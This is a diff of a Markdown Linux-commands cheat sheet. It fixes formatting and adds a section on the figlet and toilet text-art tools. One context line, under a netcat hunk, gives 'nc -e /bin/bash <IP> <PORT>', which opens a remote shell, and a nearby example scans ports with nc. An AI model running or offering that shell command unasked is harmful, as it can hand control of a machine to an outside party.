@@ -1,6 +1,7 @@
-,# Linux Commands
+# Linux Commands
 
 ## Get system info
+
 `uname` return some useful information about the specific flavor of the OS and its kernel.
 
 ```bash
@@ -45,7 +46,6 @@ grep -v something
 
 # To show before and after a grep
 cat something.txt | grep -B 5 -A 5 something
-````
 
 ## Binaries
 
@@ -695,7 +695,6 @@ arp -a
 ? (192.168.1.3) at 38:f9:d3:50:53:4f on en0 ifscope permanent [ethernet]
 ? (192.168.1.255) at ff:ff:ff:ff:ff:ff on en0 ifscope [ethernet]
 ? (239.255.255.250) at 1:0:5e:7f:ff:fa on en0 ifscope permanent [ethernet]
-
 ```
 
 ### Search all of the active IP Addresses
@@ -834,7 +833,6 @@ nc -e /bin/bash <IP> <PORT>
 Checking ports
 
 ```bash
-
 # nc -v -n -z -w1 <DomainName> <StartPortNo-EndPortNo>
 # For instance, in our example, we had the following:
 nc -v -n -z w1 192.168.133.128 1-100
@@ -849,7 +847,6 @@ nc -u <IP> <PORT>
 # Show all of the connections
 netstat -na
 netstat -tulpn
-
 ```
 
 ## FTP
@@ -858,7 +855,6 @@ You can transfer your files using FTP
 
 ```bash
 ftp <IP_ADDRESS>
-
 ```
 
 ## Telnet
@@ -964,7 +960,6 @@ The `/etc/resolv.conf` configuration file contains information that allows a c
 The process of converting domain names to IP addresses is called **resolving**.
 
 > When using DHCP, **`dhclient`** usually rewrites **`resolv.conf`** with information received from the DHCP server.
-> 
 
 There are three main configuration directives in `/etc/resolv.conf`:
 
@@ -985,7 +980,6 @@ nameserver <IP address>
 It can be your own Name Server, some [public Name Server](https://www.shellhacks.com/en/Free-Fast-Public-DNS-Servers), or the Name Server of your’s ISP.
 
 > Note: Up to 3 name servers may be listed.
-> 
 
 Example:
 
@@ -1103,6 +1097,38 @@ google.com.		200	IN	A	142.250.179.174
 ;; SERVER: 127.0.0.53#53(127.0.0.53)
 ;; WHEN: Fri May 20 02:32:56 +0430 2022
 ;; MSG SIZE  rcvd: 55
+```
+
+# Fantasy packages
+
+## Figlet
+
+You can use Figlet to print fantasy text arts.
+
+```bash
+# Install
+sudo apt install figlet
+
+# Print some text using align and width
+figlet -w 100 -c Amin-MAG
+
+# Print center of the current terminal
+figlet -t -c Amin-MAG
+
+# Read from file and print with space
+figlet -ktp < child.txt
+
+# To use custom fonts located in /usr/share/figlet
+```
+
+## Toilet
+
+```bash
+# Install 
+sudo apt install toilet
+
+# Print basic text
+toilet -k Amin-MAG
 ```
 
 # Third-Party Packages
